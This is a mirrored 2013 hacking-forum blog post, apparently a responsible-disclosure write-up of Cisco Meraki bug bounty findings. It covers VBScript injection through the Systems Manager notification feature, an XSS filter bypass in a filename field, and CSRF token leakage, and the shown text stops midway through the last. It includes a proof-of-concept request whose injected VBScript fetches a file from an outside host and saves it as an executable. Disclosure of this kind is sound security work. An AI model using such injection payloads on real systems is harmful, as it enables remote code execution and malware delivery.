@@ -1,0 +1,1884 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml" dir="ltr" lang="en">
+
+<!-- Mirrored from garage4hackers.com/entry.php?b=1044 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 12:37:17 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=ISO-8859-1" /><!-- /Added by HTTrack -->
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
+<meta id="e_vb_meta_bburl" name="vb_meta_bburl" content="index.html" />
+<base  /><!--[if IE]></base><![endif]-->
+<meta name="generator" content="vBulletin 4.2.1" />
+<meta http-equiv="X-UA-Compatible" content="IE=9" />
+
+	<link rel="Shortcut Icon" href="favicon.ico" type="image/x-icon" />
+
+
+		<meta name="keywords" content="bug bounty, cisco hacking, meraki, rahul sasi, A weekend with Cisco Meraki Bug Bounty, a tale of few web bugs ., ethical hacking,exploits,webapplication,penetration testing,wireless,information security,virus,exploit coding,vbulletin,forum,bbs,discussion,bulletin board,indian hackers" />
+		<meta name="description" content="A weekend with Cisco Meraki Bug Bounty, a tale of few web bugs . Fb1h2s aka Rahul Sasi's Blog" />
+
+
+
+	<meta property="fb:app_id" content="170793809601191" />
+<meta property="og:site_name" content="Garage4hackers Forum" />
+<meta property="og:description" content="A weekend with Cisco Meraki Bug Bounty, a tale of few web bugs . Fb1h2s aka Rahul Sasi's Blog" />
+<meta property="og:url" content="entry8161.html?b=1044" />
+<meta property="og:type" content="article" />
+
+
+
+
+	
+		<script type="text/javascript" src="../yui.yahooapis.com/comboaa66?2.9.0/build/yuiloader-dom-event/yuiloader-dom-event.js&amp;2.9.0/build/connection/connection-min.js"></script>
+	
+
+<script type="text/javascript">
+<!--
+	if (typeof YAHOO === 'undefined') // Load ALL YUI Local
+	{
+		document.write('<script type="text/javascript" src="clientscript/yui/yuiloader-dom-event/yuiloader-dom-event6719.html?v=421"><\/script>');
+		document.write('<script type="text/javascript" src="clientscript/yui/connection/connection-min6719.html?v=421"><\/script>');
+		var yuipath = 'clientscript/yui';
+		var yuicombopath = '';
+		var remoteyui = false;
+	}
+	else	// Load Rest of YUI remotely (where possible)
+	{
+		var yuipath = '../external.html?link=http://yui.yahooapis.com/2.9.0/build';
+		var yuicombopath = '../external.html?link=http://yui.yahooapis.com/combo';
+		var remoteyui = true;
+		if (!yuicombopath)
+		{
+			document.write('<script type="text/javascript" src="../yui.yahooapis.com/2.9.0/build/connection/connection-min6719.js?v=421"><\/script>');
+		}
+	}
+	var SESSIONURL = "";
+	var SECURITYTOKEN = "guest";
+	var IMGDIR_MISC = "images/misc";
+	var IMGDIR_BUTTON = "images/buttons";
+	var vb_disable_ajax = parseInt("0", 10);
+	var SIMPLEVERSION = "421";
+	var BBURL = "index.html";
+	var LOGGEDIN = 0 > 0 ? true : false;
+	var THIS_SCRIPT = "entry";
+	var RELPATH = "entry8161.html?b=1044";
+	var PATHS = {
+		forum : "",
+		cms   : "",
+		blog  : ""
+	};
+	var AJAXBASEURL = "index.html";
+// -->
+</script>
+<script type="text/javascript" src="clientscript/vbulletin-core6719.js?v=421"></script>
+
+
+
+	<link rel="alternate" type="application/rss+xml" title="Garage4hackers Forum RSS Feed" href="external9476.php?type=RSS2" />
+	
+
+
+
+	<link rel="stylesheet" type="text/css" href="css30f2.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=bbcode.css,editor.css,popupmenu.css,reset-fonts.css,vbulletin.css,vbulletin-chrome.css,vbulletin-formcontrols.css," />
+
+	<!--[if lt IE 8]>
+	<link rel="stylesheet" type="text/css" href="css.php?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=popupmenu-ie.css,vbulletin-ie.css,vbulletin-chrome-ie.css,vbulletin-formcontrols-ie.css,editor-ie.css" />
+	<![endif]-->
+
+
+	
+		
+			<link rel="alternate" type="application/rss+xml" title="Fb1h2s aka Rahul Sasi's Blog - Garage4hackers Forum Blog RSS Feed" href="blog_external9107.php?type=RSS2&amp;bloguserid=8" />
+		
+		<link rel="alternate" type="application/rss+xml" title="Garage4hackers Forum - Blog RSS Feed" href="blog_external9476.php?type=RSS2" />
+	
+	<link rel="pingback" href="forum.html" />
+	
+		<!--
+			<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
+				xmlns:dc="http://purl.org/dc/elements/1.1/"
+				xmlns:trackback="http://madskills.com/public/xml/rss/module/trackback/">
+			<rdf:Description
+				rdf:about="http://garage4hackers.com/entry.php?b=1044"
+				dc:identifier="http://garage4hackers.com/entry.php?b=1044"
+				dc:title="A weekend with Cisco Meraki Bug Bounty, a tale of few web bugs ."
+				trackback:ping="http://garage4hackers.com/blog_callback.php?b=1044" />
+			</rdf:RDF>
+		-->
+	
+	
+		<link rel="stylesheet" type="text/css" href="css68b4.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=postbit-lite.css,blog.css,lightbox.css,attachment.css" />
+	
+	<!--[if lt IE 8]>
+	<script type="text/javascript" src="clientscript/vbulletin-threadlist-ie.js?v=421"></script>
+	<link rel="stylesheet" type="text/css" href="css.php?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=postbit-lite-ie.css,blog-ie.css" />
+	<![endif]-->
+	
+	
+	
+	
+		<script type="text/javascript">
+		<!--
+			vBulletin.register_control("vB_Blog_Userid", "8");
+		//-->
+		</script>
+	
+<script type="text/javascript" src="clientscript/vbulletin_ajax_suggest6719.js?v=421"></script>
+	
+		<title>A weekend with Cisco Meraki Bug Bounty, a tale of few web bugs . - Blogs - Garage4hackers Forum</title>
+	
+	<link rel="stylesheet" type="text/css" href="css657d.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=additional.css" />
+
+</head>
+<body >
+<div class="above_body"> <!-- closing tag is in template navbar -->
+<div id="header" class="floatcontainer doc_header">
+	<div><a name="top" href="forum.html" class="logo-image"><img src="images/misc/vbulletin4_logo.html" alt="Garage4hackers Forum" /></a></div>
+	<div id="toplinks" class="toplinks">
+		
+			<ul class="nouser">
+			
+				<li><a href="register.html" rel="nofollow">Register</a></li>
+			
+				<li><a rel="help" href="faq.html">Help</a></li>
+				<li>
+			<script type="text/javascript" src="clientscript/vbulletin_md56719.html?v=421"></script>
+			<form id="navbar_loginform" action="../external.html?link=http://garage4hackers.com/login.php?do=login" method="post" onsubmit="md5hash(vb_login_password, vb_login_md5password, vb_login_md5password_utf, 0)">
+				<fieldset id="logindetails" class="logindetails">
+					<div>
+						<div>
+					<input type="text" class="textbox default-value" name="vb_login_username" id="navbar_username" size="10" accesskey="u" tabindex="101" value="User Name" />
+					<input type="password" class="textbox" tabindex="102" name="vb_login_password" id="navbar_password" size="10" />
+					<input type="text" class="textbox default-value" tabindex="102" name="vb_login_password_hint" id="navbar_password_hint" size="10" value="Password" style="display:none;" />
+					<input type="submit" class="loginbutton" tabindex="104" value="Log in" title="Enter your username and password in the boxes provided to login, or click the 'register' button to create a profile for yourself." accesskey="s" />
+						</div>
+					</div>
+				</fieldset>
+				<div id="remember" class="remember">
+					<label for="cb_cookieuser_navbar"><input type="checkbox" name="cookieuser" value="1" id="cb_cookieuser_navbar" class="cb_cookieuser_navbar" accesskey="c" tabindex="103" /> Remember Me?</label>
+				</div>
+
+				<input type="hidden" name="s" value="" />
+				<input type="hidden" name="securitytoken" value="guest" />
+				<input type="hidden" name="do" value="login" />
+				<input type="hidden" name="vb_login_md5password" />
+				<input type="hidden" name="vb_login_md5password_utf" />
+			</form>
+			<script type="text/javascript">
+			YAHOO.util.Dom.setStyle('navbar_password_hint', "display", "inline");
+			YAHOO.util.Dom.setStyle('navbar_password', "display", "none");
+			vB_XHTML_Ready.subscribe(function()
+			{
+			//
+				YAHOO.util.Event.on('navbar_username', "focus", navbar_username_focus);
+				YAHOO.util.Event.on('navbar_username', "blur", navbar_username_blur);
+				YAHOO.util.Event.on('navbar_password_hint', "focus", navbar_password_hint);
+				YAHOO.util.Event.on('navbar_password', "blur", navbar_password);
+			});
+			
+			function navbar_username_focus(e)
+			{
+			//
+				var textbox = YAHOO.util.Event.getTarget(e);
+				if (textbox.value == 'User Name')
+				{
+				//
+					textbox.value='';
+					textbox.style.color='#000000';
+				}
+			}
+
+			function navbar_username_blur(e)
+			{
+			//
+				var textbox = YAHOO.util.Event.getTarget(e);
+				if (textbox.value == '')
+				{
+				//
+					textbox.value='User Name';
+					textbox.style.color='#777777';
+				}
+			}
+			
+			function navbar_password_hint(e)
+			{
+			//
+				var textbox = YAHOO.util.Event.getTarget(e);
+				
+				YAHOO.util.Dom.setStyle('navbar_password_hint', "display", "none");
+				YAHOO.util.Dom.setStyle('navbar_password', "display", "inline");
+				YAHOO.util.Dom.get('navbar_password').focus();
+			}
+
+			function navbar_password(e)
+			{
+			//
+				var textbox = YAHOO.util.Event.getTarget(e);
+				
+				if (textbox.value == '')
+				{
+					YAHOO.util.Dom.setStyle('navbar_password_hint', "display", "inline");
+					YAHOO.util.Dom.setStyle('navbar_password', "display", "none");
+				}
+			}
+			</script>
+				</li>
+				
+					<li id="fb_headerbox" class="hidden">
+
+	<a id="fb_loginbtn" href="#"><img src="images/misc/facebook_login.html" alt="The Facebook Platform" /></a>
+
+</li>
+
+				
+			</ul>
+		
+	</div>
+	<div class="ad_global_header">
+		 
+		 
+	</div>
+	<hr />
+</div>
+<div id="navbar" class="navbar">
+	<ul id="navtabs" class="navtabs floatcontainer">
+		
+		
+	
+		<li  id="vbtab_whatsnew">
+			<a class="navtab" href="activity.html">What's New?</a>
+		</li>
+		
+		
+
+	
+		<li  id="vbtab_cms">
+			<a class="navtab" href="content.html">Articles</a>
+		</li>
+		
+		
+
+	
+		<li  id="vbtab_forum">
+			<a class="navtab" href="forum.html">Forum</a>
+		</li>
+		
+		
+
+	
+		<li class="selected" id="vbtab_blog">
+			<a class="navtab" href="blog.html">Blogs</a>
+		</li>
+		
+		
+			<ul class="floatcontainer">
+				
+					
+						
+							<li id="vbblog_recent"><a href="blog2d60.html?do=list">Recent Entries</a></li>
+						
+					
+				
+					
+						
+							<li id="vbblog_popular"><a href="blog7e3c.html?do=list&amp;blogtype=best">Most Popular</a></li>
+						
+					
+				
+					
+						
+							<li id="vbblog_member"><a href="blogd08d.html?do=bloglist">Member Blogs</a></li>
+						
+					
+				
+			</ul>
+		
+
+	
+		<li  id="tab_nja4_357">
+			<a class="navtab" href="pages7b82.html?pageid=2">G4H Team</a>
+		</li>
+		
+		
+
+	
+		<li  id="tab_nta0_579">
+			<a class="navtab" href="pages8782.html?pageid=3">IRC</a>
+		</li>
+		
+		
+
+	
+		<li  id="tab_nta0_442">
+			<a class="navtab" href="pagesdbe0.html?pageid=4">Ranchoddas</a>
+		</li>
+		
+		
+
+		<li>
+            <a class="navtab" href="pages.html">Events and Conferences</a></li>
+	</ul>
+	
+		<div id="globalsearch" class="globalsearch">
+			<form action="../external.html?link=http://garage4hackers.com/search.php?do=process" method="post" id="navbar_search" class="navbar_search">
+				
+				<input type="hidden" name="securitytoken" value="guest" />
+				<input type="hidden" name="do" value="process" />
+				<span class="textboxcontainer"><span><input type="text" value="" name="query" class="textbox" tabindex="99"/></span></span>
+				<span class="buttoncontainer"><span><input type="image" class="searchbutton" src="images/buttons/search.html" name="submit" onclick="document.getElementById('navbar_search').submit;" tabindex="100"/></span></span>
+			</form>
+			<ul class="navbar_advanced_search">
+				<li><a href="search.html" accesskey="4">Advanced Search</a></li>
+				
+			</ul>
+		</div>
+	
+</div>
+</div><!-- closing div for above_body -->
+
+<div class="body_wrapper">
+<div id="breadcrumb" class="breadcrumb">
+	<ul class="floatcontainer">
+		<li class="navbithome"><a href="content.html" accesskey="1"><img src="images/misc/navbit-home.html" alt="Home" /></a></li>
+		
+	<li class="navbit"><a href="blog.html">Blogs</a></li>
+
+	<li class="navbit"><a href="bloge81f.html?u=8">Fb1h2s aka Rahul Sasi's Blog</a></li>
+
+		
+	<li class="navbit lastnavbit"><span>A weekend with Cisco Meraki Bug Bounty, a tale of few web bugs .</span></li>
+
+	</ul>
+	<hr />
+</div>
+
+
+<div style="width:728px; margin:0 auto; padding-bottom:1em">
+<script type="text/javascript"><!--
+google_ad_client = "ca-pub-6847984837250662";
+google_ad_host = "ca-host-pub-2606800903002383";
+google_ad_width = 728;
+google_ad_height = 15;
+google_ad_format = "728x15_0ads_al_s";
+google_ad_channel = "";
+google_color_border = "";
+google_color_bg = "";
+google_color_link = "";
+google_color_text = "";
+google_color_url = "";
+google_ui_features = "rc:6";
+//-->
+</script>
+<script type="text/javascript"
+  src="../pagead2.googlesyndication.com/pagead/show_ads.js">
+</script>
+</div>
+
+<div id="ad_global_below_navbar"><script async src="../pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<!-- garage1 -->
+<ins class="adsbygoogle"
+     style="display:inline-block;width:728px;height:90px"
+     data-ad-client="ca-pub-6847984837250662"
+     data-ad-slot="4036513682"></ins>
+<script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script></div>
+
+
+	<form action="../external.html?link=http://garage4hackers.com/profile.php?do=dismissnotice" method="post" id="notices" class="notices">
+		<input type="hidden" name="do" value="dismissnotice" />
+		<input type="hidden" name="s" value="" />
+		<input type="hidden" name="securitytoken" value="guest" />
+		<input type="hidden" id="dismiss_notice_hidden" name="dismiss_noticeid" value="" />
+		<input type="hidden" name="url" value="" />
+		<ol>
+			<li class="restore" id="navbar_notice_2">
+	
+	<html>
+<h2>
+The forum is <a href="showthread1180.html?t=7049&amp;p=14985#post14985">frozen forever</a> - but it won't die; it'll stay for long in search engine results and we hope it would keep helping newbies in some way or other - cheers! 
+
+
+</h2>
+
+<!-- Mirrored from garage4hackers.com/entry.php?b=1044 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 12:37:17 GMT -->
+</html>
+</li>
+		</ol>
+	</form>
+
+
+
+<div id="usercss" class="blog">
+	<div class="cleardiv"></div>
+
+	
+	
+	<div id="content_container">
+		<div id="content">
+			<div id="content_inner" class="blockrow restrain_container">
+			<!-- main content -->
+			<div id="pagetitle">
+	
+	<a id="rssicon" href="blog_external9107.php?type=RSS2&amp;bloguserid=8" rel="nofollow"><img src="images/misc/rss_40b.html" border="0" class="inlineimg" alt="View RSS Feed" /></a>
+	
+	<h1>Fb1h2s aka Rahul Sasi's Blog</h1>
+</div>
+
+
+
+
+<div id="ad_blogshowentry_before"><script type="text/javascript"><!--
+google_ad_client = "pub-6847984837250662";
+/* 728x90, created 7/11/10 blog entry */
+google_ad_slot = "0606213533";
+google_ad_width = 728;
+google_ad_height = 90;
+//-->
+</script>
+<script type="text/javascript"
+src="../pagead2.googlesyndication.com/pagead/show_ads.js">
+</script></div>
+<div id="above_blogentry">
+	
+</div>
+<div class="block blogentrybit" id="entry1044">
+	<h4 id="blog_title" class="blog_header">
+		A weekend with Cisco Meraki Bug Bounty, a tale of few web bugs .
+		
+		
+	</h4>
+	<div class="fly">
+		
+			<div class="popupmenu" id="blograting">
+				<h6><a class="popupctrl" href="javascript://" id="blograting_current"><img class="inlineimg" src="images/rating/rating-15_5.html" alt="Rating: 17 votes, 4.88 average." /></a></h6>
+				<form action="../external.html?link=http://garage4hackers.com/blog.php" method="post" id="blog_blograte_form">
+					<div class="popupbody popuphover">
+						<ul>
+							
+								<li><label for="r5"><span class="rating r5">
+									<input type="radio" name="vote" value="5" id="r5"  /> Excellent
+								</span></label></li>
+								<li><label for="r4"><span class="rating r4_right">
+									<input type="radio" name="vote" value="4" id="r4"  /> Good
+								</span></label></li>
+								<li><label for="r3"><span class="rating r3_right">
+									<input type="radio" name="vote" value="3" id="r3"  /> Average
+								</span></label></li>
+								<li><label for="r2"><span class="rating r2_right">
+									<input type="radio" name="vote" value="2" id="r2"  /> Bad
+								</span></label></li>
+								<li><label for="r1"><span class="rating r1_right">
+									<input type="radio" name="vote" value="1" id="r1"  /> Terrible
+								</span></label></li>
+								<li class="formsubmit"><input type="submit" class="button" value="Vote Now" /></li>
+							
+						</ul>
+						<input type="hidden" name="s" value="" />
+						<input type="hidden" name="securitytoken" value="guest" />
+						<input type="hidden" name="do" value="rate" />
+						<input type="hidden" name="b" value="1044" />
+					</div>
+				</form>
+				<script type="text/javascript" src="clientscript/blog_ajax_rate6719.html?v=421"></script>
+				<script type="text/javascript">
+				<!--
+					var blogid = 1044;
+					vB_AJAX_BlogRate_Init('blog_blograte_form');
+				//-->
+				</script>
+			</div>
+		
+	</div>
+	<div class="block blogbit">
+		<div class="bloghead">
+			<div class="fly">
+				
+<a href="entry8161.html?b=1044#comments" class="comments">0 Comments</a>
+				
+				
+			</div>
+			<div class="blog_date">
+				by <div class="popupmenu memberaction">
+	<a class="username offline popupctrl" href="membere81f.html?u=8" title="fb1h2s is offline"><strong>fb1h2s</strong></a>
+	<ul class="popupbody popuphover memberaction_body">
+		<li class="left">
+			<a href="membere81f.html?u=8" class="siteicon_profile">
+				View Profile
+			</a>
+		</li>
+		
+		<li class="right">
+			<a href="search9898.html?do=finduser&amp;userid=8&amp;contenttype=vBForum_Post&amp;showposts=1" class="siteicon_forum" rel="nofollow">
+				View Forum Posts
+			</a>
+		</li>
+		
+		
+		<li class="left">
+			<a href="privatedce0.html?do=newpm&amp;u=8" class="siteicon_message" rel="nofollow">
+				Private Message
+			</a>
+		</li>
+		
+		
+		
+		<li class="right">
+			<a href="bloge81f.html?u=8" class="siteicon_blog" rel="nofollow">
+				View Blog Entries
+			</a>
+		</li>
+		
+		
+		
+		<li class="left">
+			<a href="index.html" class="siteicon_homepage">
+				Visit Homepage
+			</a>
+		</li>
+		
+		
+		
+		<li class="right">
+			<a href="list2c25.html?r=author/8-fb1h2s" class="siteicon_article" rel="nofollow">
+				View Articles
+			</a>
+		</li>
+		
+
+		
+
+		
+		
+	</ul>
+</div>, 07-02-2013 at 02:15 PM  (24874 Views)
+			</div>
+		</div>
+		
+			
+<fb:like href="entry8161.html?b=1044" font="tahoma" layout="standard" show_faces="false" width="260" action="../external.html?link=http://garage4hackers.com/like" colorscheme="light"></fb:like>
+		
+		<div class="blogbody postcontainer">
+			<div id="entry_text_1044">
+				<blockquote class="blogcontent restore floatcontainer">
+					I was not much interested in bug bounties but the fact that I was interested in learning about Cloud Based products, and going through <a href="../external.html?link=http://meraki.cisco.com/â€Ž<br />http://meraki.cisco.com/â€Ž<br />" target="_blank">meraki</a> made me a lot interested in there service. Meraki is a &quot;cloud-managed network infrastructure company,&quot; whose products are designed to provide large-scale, distributed wired and wireless networks. An application to manage networks from cloud is big and cool to experiment for a hacker. <br />
+<br />
+So I decided to spent a week end of mine [ May 4th and 5th ] trying to understand there products and working and hacking them.  All the bugs mentioned here are reported to them by may second week and patched .I am a lot thankful to meraki for giving this opportunity . I was not planning to post this bug report as there is nothing new in it, but later decided to blog about them. This was mainly because I see a lot of my friends who participate in bug bounties and get paid but I hardly get to see there bug reports :P .  So even if this is small I decided to share it .<br />
+<br />
+<br />
+<b><u>Bug 1: Remote Client code Execution <br />
+</u></b><br />
+<br />
+Meraki System Manger:<br />
+<br />
+Is a remote management application to manage Windows|Linux|Android|Mac machines from the cloud. <br />
+<br />
+The meraki live tools, part of system manager application allows manager users to sent a message to the remote client. <br />
+<br />
+<a href="../external.html?link=https://n34.meraki.com/Systems-Manager/n/Vo6a5cI/manage/pcc/list#pn=clientid" target="_blank">https://n34.meraki.com/Systems-Manag...st#pn=clientid</a>.<br />
+<br />
+<img src="attachmentcf5b.jpg?attachmentid=614&amp;d=1372754665" border="0" alt="Name:  b1_im1.jpg
+Views: 1393
+Size:  15.4 KB"  style="float: CONFIG" /><br />
+<br />
+This allows the admin to sent a message to a connected client and the message would be displayed to the end user.<br />
+<br />
+<br />
+<img src="attachmente919.jpg?attachmentid=603&amp;d=1372750045" border="0" alt="Name:  b1_im2.jpg
+Views: 1403
+Size:  24.9 KB"  style="float: CONFIG" /><br />
+<br />
+ <br />
+<br />
+Even though this feature is only supposed to display a message box to the end user, this is vulnerable to a remote code execution on the client user. <br />
+<br />
+<u>How Send Notification works. <br />
+</u><br />
+On sending the following notification request on System manager app to client.<br />
+<br />
+POST /Systems-Manager/n/Vo6a5cI/manage/pcc/msg/582090251837638886 HTTP/1.1<br />
+Host: n34.meraki.com<br />
+Connection: keep-alive<br />
+Origin: <a href="../external.html?link=https://n34.meraki.com/" target="_blank">https://n34.meraki.com</a><br />
+X-Requested-With: XMLHttpRequest<br />
+Cookie:<br />
+<br />
+msg=fb1h2s<br />
+<br />
+<br />
+ <img src="attachmentd4eb.jpg?attachmentid=604&amp;d=1372750162" border="0" alt="Name:  b1_im3.jpg
+Views: 1331
+Size:  23.3 KB"  style="float: CONFIG" /><br />
+<br />
+The meraki client [m_agen-service.exe] communicates with the remote meraki server for fetching instructions.  Once the notification text is received the applications writes it to a vbs file at %temp%/m_agent-msg.vbs with a message box code.<br />
+With some reverse engineering I was able to figure this out. <img src="attachment0844.png?attachmentid=605&amp;d=1372750600" border="0" alt="Name:  Screen Shot 2013-07-02 at 1.05.53 PM.png
+Views: 1304
+Size:  11.2 KB"  style="float: CONFIG" /><br />
+<br />
+And later execute it using cscript.exe with the privileges of nt authority\system.<br />
+<br />
+<img src="attachmentf609.png?attachmentid=606&amp;d=1372750612" border="0" alt="Name:  Screen Shot 2013-07-02 at 1.05.59 PM.png
+Views: 1300
+Size:  14.7 KB"  style="float: CONFIG" /><br />
+<br />
+<br />
+<br />
+The above functional architecture is pretty poor as well as no filtering is done on what text goes inside the vbs file.<br />
+<br />
+It is possible for an attacker to inject additional vbs code to the temp file and get it executed by truncating the message box code with a double quote.<br />
+<br />
+<u><b>Poc code: <br />
+</b></u><br />
+<img src="attachmente0c2.png?attachmentid=607&amp;d=1372750621" border="0" alt="Name:  Screen Shot 2013-07-02 at 1.06.08 PM.png
+Views: 1295
+Size:  14.7 KB"  style="float: CONFIG" /><br />
+<br />
+<br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<pre class="bbcode_code"style="height:84px;">POST /Systems-Manager/n/Vo6a5cI/manage/pcc/msg/582090251837638886 
+
+msg=fb1h2s” 
+           More vbs code here
+          ‘ Comment out second double quote</pre>
+</div>This way it’s possible to use the system notification option to download deploy a metsploit metpreter executable, or any other malicious applications. The following poc request | code download a remote file and write it to c:\1.exe .<br />
+<br />
+<div class="bbcode_container">
+	<div class="bbcode_description">PHP Code:</div>
+	<div class="bbcode_code"style="height:252px;"><code><code><span style="color: #000000">
+<span style="color: #0000BB">POST&nbsp;</span><span style="color: #007700">/</span><span style="color: #0000BB">Systems</span><span style="color: #007700">-</span><span style="color: #0000BB">Manager</span><span style="color: #007700">/</span><span style="color: #0000BB">n</span><span style="color: #007700">/</span><span style="color: #0000BB">Vo6a5cI</span><span style="color: #007700">/</span><span style="color: #0000BB">manage</span><span style="color: #007700">/</span><span style="color: #0000BB">pcc</span><span style="color: #007700">/</span><span style="color: #0000BB">msg</span><span style="color: #007700">/</span><span style="color: #0000BB">582090251837638886&nbsp;HTTP</span><span style="color: #007700">/</span><span style="color: #0000BB">1.1<br />Host</span><span style="color: #007700">:&nbsp;</span><span style="color: #0000BB">n34</span><span style="color: #007700">.</span><span style="color: #0000BB">meraki</span><span style="color: #007700">.</span><span style="color: #0000BB">com<br />Connection</span><span style="color: #007700">:&nbsp;</span><span style="color: #0000BB">keep</span><span style="color: #007700">-</span><span style="color: #0000BB">alive<br />X</span><span style="color: #007700">-</span><span style="color: #0000BB">Requested</span><span style="color: #007700">-</span><span style="color: #0000BB">With</span><span style="color: #007700">:&nbsp;</span><span style="color: #0000BB">XMLHttpRequest<br />Cookie</span><span style="color: #007700">:&nbsp;<br /><br /></span><span style="color: #0000BB">msg</span><span style="color: #007700">=</span><span style="color: #0000BB">1</span><span style="color: #DD0000">"<br />u&nbsp;=&nbsp;"</span><span style="color: #0000BB">http</span><span style="color: #007700">:</span><span style="color: #FF8000">//www.in.com/"<br /></span><span style="color: #0000BB">d&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #DD0000">"C:\1.exe"<br /></span><span style="color: #0000BB">Set&nbsp;h&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">CreateObject</span><span style="color: #007700">(</span><span style="color: #DD0000">"MSXML2.XMLHTTP"</span><span style="color: #007700">)<br /></span><span style="color: #0000BB">Set&nbsp;s&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">CreateObject</span><span style="color: #007700">(</span><span style="color: #DD0000">"ADODB.Stream"</span><span style="color: #007700">)<br /></span><span style="color: #0000BB">h</span><span style="color: #007700">.</span><span style="color: #0000BB">open&nbsp;</span><span style="color: #DD0000">"GET"</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">u</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">false<br />h</span><span style="color: #007700">.</span><span style="color: #0000BB">send</span><span style="color: #007700">()<br /></span><span style="color: #0000BB">s</span><span style="color: #007700">.</span><span style="color: #0000BB">Open<br />s</span><span style="color: #007700">.</span><span style="color: #0000BB">Type&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">1<br />s</span><span style="color: #007700">.</span><span style="color: #0000BB">Write&nbsp;h</span><span style="color: #007700">.</span><span style="color: #0000BB">ResponseBody<br />s</span><span style="color: #007700">.</span><span style="color: #0000BB">Position&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">0<br />s</span><span style="color: #007700">.</span><span style="color: #0000BB">SaveToFile&nbsp;d<br /></span><span style="color: #DD0000">'&nbsp;<br /></span>
+</span>
+</code></code></div>
+</div><img src="attachmentcf17.jpg?attachmentid=608&amp;d=1372751116" border="0" alt="Name:  metpre.jpg
+Views: 1403
+Size:  26.4 KB"  style="float: CONFIG" /><br />
+Image from Internet:<br />
+<br />
+<br />
+<u><b>Impact And Recomendations:<br />
+</b></u><br />
+It is possible to use the same bug to get code execution on all connected clients .<br />
+<br />
+<br />
+Using Cscript to launch a message box would not a good idea.I am not adding recommendations here, as am not fully aware of the functional requirements for this feature. <br />
+<br />
+<br />
+Now this is a bug in the remote client management interface the criticality is less since the application itself is a remote management software. The bug would be by default worse if this is posible form a non-admin account. There was a least privileged manager user, but I was not able to test from that user based on some difficulties I faced trying to register a non-manager account. I confirmed this with Jeo Pomes [meraki] and he confirmed that user was not vulnerable to this attack.<br />
+<br />
+Now inorder to make this more critical we need to find and XSS or CSRF bug , that way it would be Kaboom and mass pawning. <u><b>So the rest of the bugs were found to make the first bug more dangerous .</b></u><br />
+<br />
+<u><b>BUG 2: <br />
+</b></u><br />
+<br />
+<br />
+<u>Bug 2: XSS in Systems Manager<br />
+</u>Criticality: Medium<br />
+<br />
+<br />
+Affected Page: <br />
+<a href="../external.html?link=https://n34.meraki.com/Systems-Manager/n/7iHAgbI/manage/configure/pcc_mobile_profiles" target="_blank">https://n34.meraki.com/Systems-Manag...obile_profiles</a><br />
+<br />
+The Application where it accepts IOS configuration file does not properly sanitize the filename parameter. This allows an arbitrary payload injection.<br />
+There is a small filtering in the backend on the filename, which could be easily bypassed. The filter only checks for [ ; , : , / , \ , ” , ; ] characters. And if any of the above occurrences in the string is found, the input is truncated from that index.<br />
+<br />
+We can bypass the above filter by crafting a payload that does not require any filtered characters; an example of on such filename payload would be.<br />
+<br />
+<img src="attachmentaf15.png?attachmentid=609&amp;d=1372752579" border="0" alt="Name:  Screen Shot 2013-07-02 at 1.39.04 PM.png
+Views: 1286
+Size:  17.7 KB"  style="float: CONFIG" /><br />
+<br />
+<br />
+<u>POC replication: <br />
+</u><br />
+1) A configuration files with any of these filenames [possible on mac or Lnx ] <br />
+<br />
+ <img src="attachment1e6a.jpg?attachmentid=610&amp;d=1372752622" border="0" alt="Name:  Screen Shot 2013-07-02 at 1.39.59 PM.jpg
+Views: 1292
+Size:  7.8 KB"  style="float: CONFIG" /><br />
+<br />
+<br />
+2) Upload the configuration file at <br />
+<br />
+<a href="../external.html?link=https://n34.meraki.com/Systems-Manager/n/7iHAgbI/manage/configure/pcc_mobile_profiles" target="_blank">https://n34.meraki.com/Systems-Manag...obile_profiles</a><br />
+<br />
+<br />
+<br />
+<u><u><b>Bug 3:  CSRF token leakage. <br />
+</b></u></u>Criticality: Medium<br />
+<br />
+The above bug can be used to leak the victim CSRF token. <br />
+An interesting thing about the above bug is, it’s possible to leak the CSRF token (authenticity_token) of the victim. Even though it’s obvious that the tokens could be stolen using the above XSS, am trying to address a second issue here. <br />
+<br />
+The above page loads the following javascript.<br />
+<a href="../n34.meraki.com/javascripts/vendor.pack1591.js?mtime=1363890917" target="_blank">https://n34.meraki.com/javascripts/v...ime=1363890917</a><br />
+<br />
+ And if the crafted payload is a &lt;script&gt; tag with a source,<br />
+<br />
+<img src="attachmentfb11.png?attachmentid=611&amp;d=1372752729" border="0" alt="Name:  Screen Shot 2013-07-02 at 1.41.40 PM.png
+Views: 1291
+Size:  11.0 KB"  style="float: CONFIG" /><br />
+<br />
+then the above JavaScript will make an XHR request, crafting the following request. <br />
+<br />
+<img src="attachment325a.jpg?attachmentid=612&amp;d=1372752754" border="0" alt="Name:  Screen Shot 2013-07-02 at 1.41.49 PM.jpg
+Views: 1285
+Size:  15.9 KB"  style="float: CONFIG" /><br />
+<br />
